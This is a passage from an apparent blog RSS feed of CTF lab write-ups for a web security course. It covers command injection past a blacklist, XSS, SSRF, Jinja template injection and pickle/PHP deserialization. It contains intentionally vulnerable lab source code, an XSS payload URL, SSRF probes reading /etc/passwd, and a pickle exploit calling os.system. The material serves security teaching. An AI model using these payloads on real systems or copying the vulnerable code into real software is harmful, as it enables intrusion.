&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</guid><description>&lt;h1 id="simple-web-0x10lab---dns-lookup-tool--waf">
 Simple Web 0x10(Lab - DNS Lookup Tool | WAF)
 &lt;a class="anchor" href="#simple-web-0x10lab---dns-lookup-tool--waf">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/7b8uMzpCfug?t=3612">2022/03/30 網頁安全&lt;/a>
&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command injection&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;DNS Lookup Tool | WAF&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;section class=&amp;#34;section&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;column is-6 is-offset-3 has-text-centered&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;box&amp;#34;&amp;gt;
 &amp;lt;h1 class=&amp;#34;title&amp;#34;&amp;gt;DNS Lookup Tool 🔍 | WAF Edition&amp;lt;/h1&amp;gt;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;field&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;control&amp;#34;&amp;gt;
 &amp;lt;input class=&amp;#34;input&amp;#34; type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;example.com&amp;#34; id=&amp;#34;hostname&amp;#34; value=&amp;#34;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;#34;&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;button class=&amp;#34;button is-block is-info is-fullwidth&amp;#34;&amp;gt;
 Lookup!
 &amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;br&amp;gt;
 &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
 &amp;lt;section class=&amp;#34;has-text-left&amp;#34;&amp;gt;
 &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
 &amp;lt;pre&amp;gt;
 &amp;lt;?php
 $blacklist = [&amp;#39;|&amp;#39;, &amp;#39;&amp;amp;&amp;#39;, &amp;#39;;&amp;#39;, &amp;#39;&amp;gt;&amp;#39;, &amp;#39;&amp;lt;&amp;#39;, &amp;#34;\n&amp;#34;, &amp;#39;flag&amp;#39;];
 $is_input_safe = true;
 foreach ($blacklist as $bad_word)
 if (strstr($_POST[&amp;#39;name&amp;#39;], $bad_word) !== false) $is_input_safe = false;

 if ($is_input_safe)
 system(&amp;#34;host &amp;#39;&amp;#34; . $_POST[&amp;#39;name&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;);
 else
 echo &amp;#34;HACKER!!!&amp;#34;;
 ?&amp;gt;
 &amp;lt;/pre&amp;gt;
 &amp;lt;/section&amp;gt;
 &amp;lt;?php endif; ?&amp;gt;
 &amp;lt;hr&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/section&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt; 
&lt;/code>&lt;/pre>&lt;p>:::
It set some protection such as blacklist.&lt;/p></description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</guid><description>&lt;h1 id="simple-web-0x11lab---xss-me">
 Simple Web 0x11(Lab - XSS Me)
 &lt;a class="anchor" href="#simple-web-0x11lab---xss-me">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8800/">http://h4ck3r.quest:8800/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler
攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取&lt;code>COOKIE&lt;/code>之類的)
&lt;img src="https://i.imgur.com/lZ0bj41.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/grJXpr7.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/q9fwa6z.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;User not found.&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Check XSS
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;youshallnotpass&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/OffMAUF.png" alt="" />&lt;/li>
&lt;li>Try to inject script tag
Payload: &lt;code>http://h4ck3r.quest:8800/?type=error&amp;amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E//&lt;/code>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;//&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/1cZJvIv.png" alt="" />&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>Hint
If you login as guest(password = guest), then you can get the response
&lt;img src="https://i.imgur.com/s2R75Xf.png" alt="" />&lt;/li>
&lt;/ul>
&lt;ol start="3">
&lt;li>
&lt;p>Fetch flag and send to &lt;a href="https://beeceptor.com/">beeceptor&lt;/a>
Payload:&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
 Simple Web 0x12(Lab - Web Preview Card)
 &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="exploit---ssrf">
 Exploit - SSRF
 &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
&lt;/h2>
&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Test it
&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Analyze &lt;code>flag.php&lt;/code>
&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
?&amp;gt;
&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php
if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
 echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::
If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
 Simple Web 0x12(Lab - Web Preview Card)
 &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="exploit---ssrf">
 Exploit - SSRF
 &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
&lt;/h2>
&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Test it
&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Analyze &lt;code>flag.php&lt;/code>
&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
?&amp;gt;
&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php
if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
 echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::
If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</guid><description>&lt;h1 id="simple-web-0x13lab---ssrfrog">
 Simple Web 0x13(Lab - SSRFrog)
 &lt;a class="anchor" href="#simple-web-0x13lab---ssrfrog">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8501/">http://h4ck3r.quest:8501/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://pjchender.dev/javascript/js-set/">javascript Set()&lt;/a>
&lt;a href="https://youtu.be/hWC-Evt-sBc?t=9867">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#34;express&amp;#34;);
const http = require(&amp;#34;http&amp;#34;);

const app = express();

app.get(&amp;#34;/source&amp;#34;, (req, res) =&amp;gt; {
 return res.sendFile(__filename);
})
app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
 const { url } = req.query;
 if (!url || typeof url !== &amp;#39;string&amp;#39;) return res.sendFile(__dirname + &amp;#34;/index.html&amp;#34;);

 // no duplicate characters in `url`
 if (url.length !== new Set(url).size) return res.sendFile(__dirname + &amp;#34;/frog.png&amp;#34;);

 try {
 http.get(url, resp =&amp;gt; {
 resp.setEncoding(&amp;#34;utf-8&amp;#34;);
 resp.statusCode === 200 ? resp.on(&amp;#39;data&amp;#39;, data =&amp;gt; res.send(data)) : res.send(&amp;#34;:(&amp;#34;);
 }).on(&amp;#39;error&amp;#39;, () =&amp;gt; res.send(&amp;#34;WTF?&amp;#34;));
 } catch (error) {
 res.send(&amp;#34;WTF?&amp;#34;);
 }
});

app.listen(3000, &amp;#39;0.0.0.0&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</guid><description>&lt;h1 id="simple-web-0x14lab---debug">
 Simple Web 0x14(Lab - Debug)
 &lt;a class="anchor" href="#simple-web-0x14lab---debug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9020/">http://h4ck3r.quest:9020/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, request, Response
import urllib.request
import json

app = Flask(__name__)

app.config[&amp;#39;FLAG&amp;#39;] = &amp;#34;FL4G{fake_flag}&amp;#34;

@app.route(&amp;#39;/&amp;#39;)
def index():
 return &amp;#39;&amp;#39;&amp;#39;
&amp;lt;form action=&amp;#34;/proxy&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;url&amp;#34; placeholder=&amp;#34;URL&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;/source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;#34;/debug&amp;#34;&amp;gt;Debug&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
&amp;#39;&amp;#39;&amp;#39;

@app.route(&amp;#34;/proxy&amp;#34;)
def proxy():
 url = request.args.get(&amp;#34;url&amp;#34;)
 if url is None:
 return &amp;#34;No URL provided&amp;#34;
 if &amp;#34;https://&amp;#34; not in url:
 url = &amp;#34;https://&amp;#34; + url
 try:
 with urllib.request.urlopen(url) as response:
 return response.read()
 except urllib.error.HTTPError as e:
 return str(e)

@app.route(&amp;#34;/debug&amp;#34;)
def debug():
 # only allow access for localhost
 if request.remote_addr != &amp;#34;127.0.0.1&amp;#34;:
 return &amp;#34;Access denied&amp;#34;, 403
 return json.dumps(app.config, default=lambda _: None)

@app.route(&amp;#34;/source&amp;#34;)
def source():
 import re
 source_code = open(__file__).read()
 source_code = re.sub(r&amp;#39;FLAG{.*}&amp;#39;, r&amp;#39;FL4G{fake_flag}&amp;#39;, source_code, count=1)
 return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</guid><description>&lt;h1 id="simple-web-0x155pickle">
 Simple Web 0x15.5(Pickle)
 &lt;a class="anchor" href="#simple-web-0x155pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background---pickle">
 Background - Pickle
 &lt;a class="anchor" href="#background---pickle">#&lt;/a>
&lt;/h2>
&lt;p>Python magic method: &lt;code>__reduce__&lt;/code>
&lt;code>__recude__&lt;/code> is used to define what needs to be done when deserializing.
&lt;a href="https://youtu.be/73uI7BK8k3g?t=236">Web Hacking | 終章【EDU-CTF 2021】&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;code>exploit.py&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">import pickle
import os
import pickletools

class exploit(object):
 def __reduce__(self):
 return (os.system, (&amp;#39;pwd&amp;#39;,))
 

serialized = pickle.dumps(exploit())
print(bytes.hex(serialized))
optim_s = pickletools.optimize(serialized)
print(pickletools.dis(serialized))
print(pickletools.dis(optim_s))
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;hr>
&lt;p>:::spoiler server_app.py&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import pickle

serialized = bytes.fromhex(input(&amp;#39;Data: &amp;#39;))
pickle.loads(serialized)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</guid><description>&lt;h1 id="simple-web-0x15lab---jinja">
 Simple Web 0x15(Lab - &lt;code>Jinja&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x15lab---jinja">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8700/">http://h4ck3r.quest:8700/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, render_template_string, request, send_file

app = Flask(__name__)


@app.get(&amp;#34;/&amp;#34;)
def home():
 return render_template_string(&amp;#34;&amp;#34;&amp;#34;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;Your name&amp;#34;&amp;gt;
 &amp;lt;button&amp;gt;submit&amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;/source&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
 &amp;#34;&amp;#34;&amp;#34;)


@app.post(&amp;#34;/&amp;#34;)
def welcome_message():
 name = request.form.get(&amp;#39;name&amp;#39;)
 return render_template_string(&amp;#34;&amp;lt;p&amp;gt;Hello, &amp;#34; + name + &amp;#34;&amp;lt;/p&amp;gt;&amp;#34;)


@app.get(&amp;#34;/source&amp;#34;)
def source():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


if __name__ == &amp;#39;__main__&amp;#39;:
 app.run(threaded=True, debug=True)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</guid><description>&lt;h1 id="simple-web-0x165php-unserialize">
 Simple Web 0x16.5(php unserialize)
 &lt;a class="anchor" href="#simple-web-0x165php-unserialize">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>php magic method
&lt;img src="https://i.imgur.com/xQrh7vo.png" alt="" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">class cat
{
 public $sound = &amp;#39;ls&amp;#39;;
 function __wakeup()
 {
 system(&amp;#34;echo&amp;#34;.$this-&amp;gt;sound);
 }
}
$cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
&lt;/code>&lt;/pre>&lt;h2 id="description--analyze">
 Description &amp;amp; Analyze
 &lt;a class="anchor" href="#description--analyze">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ php -a
php &amp;gt; class cat
php &amp;gt; public {
php { public $sound = &amp;#39;ls&amp;#39;;
php { function __wakeup()
php { {
php { system(&amp;#34;echo &amp;#34;.$this-&amp;gt;sound);
php { }
php { }
php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;meow&amp;#34;;}&amp;#39;;
php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
meow
